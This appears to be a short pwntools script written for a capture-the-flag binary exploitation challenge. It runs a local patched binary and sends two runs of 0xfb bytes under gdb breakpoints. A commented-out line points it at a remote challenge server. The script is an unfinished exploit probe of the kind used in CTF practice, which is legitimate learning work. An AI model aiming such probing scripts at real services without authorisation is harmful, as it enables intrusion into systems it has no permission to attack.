from pwn import *

elf = context.binary = ELF("./chall_patched")

NC = "nc 34.101.122.7 10001".split()

r = process("./chall_patched")
# r = remote(NC[1],NC[2])

r.sendline(b"\xfb"*25)

gdb.attach(
    r,
    "b *0x000000000040131e\nb *0x000000000040134f"
)
pause()

r.sendline(b"\xfb"*128)

r.interactive()